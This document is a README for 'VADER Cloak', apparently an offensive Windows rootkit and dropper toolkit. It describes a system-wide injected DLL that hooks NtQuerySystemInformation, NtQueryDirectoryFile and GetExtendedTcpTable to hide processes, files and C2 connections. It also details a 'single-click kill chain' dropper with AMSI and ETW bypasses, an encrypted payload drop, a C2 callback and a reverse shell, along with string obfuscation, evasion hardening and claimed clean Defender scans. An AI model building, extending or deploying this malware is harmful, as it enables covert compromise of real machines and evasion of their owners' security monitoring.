# VADER Cloak — User-Mode Concealment Layer

## Overview

System-wide inline hooking DLL that hides VADER processes, files, and network connections from the operating system's own APIs. Task Manager, dir, Explorer, netstat, and any application using these APIs will not see hidden items.

## Architecture

```
cloak_loader.exe
    │
    ├── LoadLibrary("cloak.dll")
    ├── SetWindowsHookEx(WH_CBT, CloakHookProc, hDll, 0)
    │       └── dwThreadId=0 → system-wide → every GUI process loads cloak.dll
    │
    └── cloak.dll (injected into every GUI process)
            │
            ├── DllMain(DLL_PROCESS_ATTACH)
            │       ├── install_process_hook()   ← NtQuerySystemInformation
            │       ├── install_file_hook()       ← NtQueryDirectoryFile
            │       └── install_connection_hook() ← GetExtendedTcpTable
            │
            └── DllMain(DLL_PROCESS_DETACH)
                    └── remove_all_hooks()
```

## Inline Hook Engine

12-byte absolute JMP using `mov rax, <addr>; jmp rax`.

Two trampoline modes handle the Windows 11 Build 26200+ syscall validation mitigation:

### Self-Contained Trampoline (NT stubs)

For ntdll functions, the entire 24-byte stub is copied into the trampoline. No JMP back to ntdll. The trampoline IS the complete function.

```
NT Stub Layout (24 bytes):
  4C 8B D1             mov r10, rcx          (3B)
  B8 XX XX 00 00       mov eax, <syscall#>   (5B)
  F6 04 25 08 03 FE 7F 01  test [...], 1     (8B)
  75 03                jne +3                 (2B)
  0F 05                syscall                (2B)
  C3                   ret                    (1B)
  CD 2E                int 2e                 (2B)
  C3                   ret                    (1B)
```

Target patched: 12-byte JMP + 12 NOP bytes.

### JMP-Back Trampoline (non-NT functions)

For functions that don't contain syscall instructions (iphlpapi.dll etc), the trampoline saves N bytes + appends a 12-byte JMP back to target+N.

### Windows 11 Build 26200 Syscall Validation

**Discovery**: Windows 11 Build 26200 has kernel-level validation that blocks mid-function entry into NT stubs. Specifically:

| Test | What | Result |
|------|------|--------|
| A | Direct call to NtQSI | SUCCESS |
| B | Full stub copy from VirtualAlloc page (incl. syscall+ret) | SUCCESS |
| C | 8 bytes copied + JMP to ntdll+8 | BLOCKED (0xC000001C) |
| D | 8 bytes copied + JMP to syscall instruction | BLOCKED (0xC000001C) |
| E | Pure JMP to NtQSI+0 (no byte copy) | SUCCESS |

**Pattern**: The kernel rejects execution flows that enter an NT stub mid-function. Executing the entire stub from a non-ntdll page (Test B) works — the kernel does NOT restrict the memory location of the syscall instruction, only split-execution patterns.

**Solution**: Copy the full 24-byte NT stub into the trampoline. The trampoline is self-contained with its own `syscall; ret` — no JMP back to ntdll needed.

## Hook Targets

### Process Hiding — NtQuerySystemInformation
- save_size=24, self_contained=TRUE
- SystemProcessInformation (class 5) returns a linked list
- Walk the list, unlink entries matching HIDDEN_PROCESSES[]
- Handles first entry (memmove), middle entry (adjust NextEntryOffset), last entry (set prev→0)
- Effect: Task Manager, tasklist, Process Explorer — process vanishes

### File Hiding — NtQueryDirectoryFile
- save_size=24, self_contained=TRUE
- Handles 4 FileInformationClass values (1, 2, 3, 37) with different struct layouts
- Walk directory entries, unlink matching filenames
- Handles ReturnSingleEntry (returns STATUS_NO_MORE_ENTRIES)
- Effect: dir, Explorer, Get-ChildItem — files vanish

### Connection Hiding — GetExtendedTcpTable (iphlpapi.dll)
- save_size=17, self_contained=FALSE (JMP-back trampoline)
- Filters MIB_TCPTABLE_OWNER_PID entries matching HIDDEN_C2_PORT
- Handles TCP_TABLE_OWNER_PID_ALL and TCP_TABLE_OWNER_PID_CONNECTIONS
- Effect: netstat, Resource Monitor — C2 connection vanishes

## Configuration

Edit `cloak.h` before compiling:

```c
HIDDEN_PROCESSES[]  — process names to hide
HIDDEN_FILES[]      — filenames to hide from dir/Explorer
HIDDEN_C2_PORT      — TCP port to filter from netstat (default: 4444)
```

## Build

```
python cloak/build_cloak.py          # build + Defender scan
python cloak/build_cloak.py --scan   # explicit scan flag
```

Requires Visual Studio with MSVC x64 toolchain.

Output: `cloak/bin/cloak.dll`, `cloak/bin/cloak_loader.exe`

## Test Results (Win11 Build 26200)

```
test_inline.exe — Standalone hook test:
  [Test 1] Trampoline direct call:   0x00000000 SUCCESS
  [Test 2] NtQSI class 2 via hook:   0x00000000 SUCCESS
  [Test 3] NtQSI class 5 via hook:   0x00000000 SUCCESS (1MB data)
  [Test 4] Post-restore direct call: 0x00000000 SUCCESS

test_hook.exe — Process hiding:
  Before: 523 processes, dark_room.exe visible (1)
  After:  522 processes, dark_room.exe HIDDEN (0)
  Unhook: 523 processes, dark_room.exe visible (1)
  PROCESS HIDING: WORKING
```

## Usage

```
cloak_loader.exe [path_to_cloak.dll]
```

1. Run as administrator
2. Loader installs system-wide CBT hook
3. Every GUI process loads cloak.dll on next window event
4. Hooks activate on DLL_PROCESS_ATTACH — concealment immediate
5. Press ENTER to unhook and exit

## Limitations

- **GUI processes only**: WH_CBT hook only injects into processes with a message loop. Console-only processes (cmd.exe, powershell.exe without Windows Terminal) may not receive the DLL.
- **64-bit only**: DLL only hooks 64-bit processes. 32-bit processes are not cloaked.
- **iphlpapi prologue**: GetExtendedTcpTable is not an NT stub — its function prologue varies by Windows build. 17-byte save covers Win11 26200 but may need testing on other builds.
- **Existing hook detection**: If another security product has already inline-hooked the same functions, our hook patches their detour, not the original. On Defender-only systems (no EDR inline hooks), this is not an issue.

## Files

```
cloak/
├── cloak.h              Config: process names, filenames, C2 port
├── hook_engine.h        Hook engine types and prototypes
├── hook_engine.c        x64 inline hook install/remove/trampoline
├── hide_process.c       NtQuerySystemInformation hook
├── hide_file.c          NtQueryDirectoryFile hook
├── hide_connection.c    GetExtendedTcpTable hook
├── cloak.c              DLL entry point + CBT hook proc
├── cloak.def            DLL exports
├── cloak_loader.c       System-wide hook installer
├── vader_dropper.c      Single-click full kill chain dropper
├── gen_payload.py       Encrypted payload generator (DLL → C byte array)
├── cloak_payload.h      Auto-generated encrypted DLL blob
├── c2_listen.py         Operator notification listener
├── build_cloak.py       Build script (DLL + loader + dropper)
├── test_inline.c        Standalone trampoline test
├── test_hook.c          Full hook test (process + connection)
├── test_debug.c         Hook debug dump
├── test_syscall.c       Syscall origin validation test (5 scenarios)
├── test_cloak.py        Python baseline visibility check
├── dump_targets.c       Function prologue dumper
└── bin/
    ├── cloak.dll            Concealment DLL (105 KB)
    ├── cloak_loader.exe     Hook installer (143 KB)
    └── vader_dropper.exe    Full kill chain dropper (262 KB)
```

## VADER Dropper — Single-Click Kill Chain

`vader_dropper.exe` — one binary, one click, full kill chain:

1. **Dark Room** — AMSI bypass (HWBP DR0 on AmsiScanBuffer → E_INVALIDARG) + ETW bypass (DR1 on EtwEventWrite → STATUS_SUCCESS). DR registers set via VEH² technique (RaiseException → VEH handler modifies CONTEXT → NtContinue restores silently). No SetThreadContext — no ETW-TI kernel callback.
2. **Cloak Deploy** — Drops encrypted cloak.dll from embedded payload (32-byte rolling XOR, random key per build). Decrypts to memory, writes to temp, LoadLibrary.
3. **System-Wide Hook** — SetWindowsHookEx(WH_CBT, 0) spreads concealment to all GUI processes.
4. **C2 Notification** — TCP callback to operator on port 53683. Sends `hostname|cloak_status|shell_port`. Minimal wire format, no keywords.
5. **Reverse Shell** — WSASocket(dwFlags=0) → connect → cmd.exe with inherited handles. Reconnect loop.
6. **Cleanup** — UnhookWindowsHookEx, FreeLibrary, DeleteFile on exit.

### String Concealment

All operational strings XOR-encrypted at rest:
- API names: amsi.dll, AmsiScanBuffer, ntdll.dll, EtwEventWrite (XOR key 0xB5)
- Shell config: cmd.exe, C2 address (XOR key 0xBE)
- Internal names: CloakHookProc, msvcrt_cache.dll (XOR key 0xB5)
- Embedded DLL: 107KB payload encrypted with 32-byte random rolling XOR key
- Notification: no readable keywords in wire format

String leak audit (16/16 patterns invisible): amsi, AmsiScanBuffer, EtwEventWrite, cmd.exe, 192.168, CloakHookProc, msvcrt_cache, ntdll, NtQuery, VADER, 4444, SetThreadContext, hostname, cloak=, shell=, connected.

### Hardening Applied

| Fix | Before | After | Impact |
|-----|--------|-------|--------|
| VEH² DR setup | SetThreadContext → ETW-TI HIGH | RaiseException → NtContinue → SILENT | Eliminates kernel syscall telemetry |
| Port change | 4444 (Metasploit IOC) | 53682 | Removes network signature match |
| Drop attribute | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_NORMAL | Reduces BM dropper signal |
| Payload encryption | Raw MZ header visible | 32-byte rolling XOR | No PE patterns at rest |

### C2 Listener

```
python cloak/c2_listen.py              # listen on 0.0.0.0:53683
python cloak/c2_listen.py 53683        # explicit port
```

Parses dropper callbacks and displays hostname, cloak status, shell port.

## Defender Status

```
Defender 4.18.26050.15-0
cloak.dll:           CLEAN (0 detections)
cloak_loader.exe:    CLEAN (0 detections)
vader_dropper.exe:   CLEAN (0 detections)
```
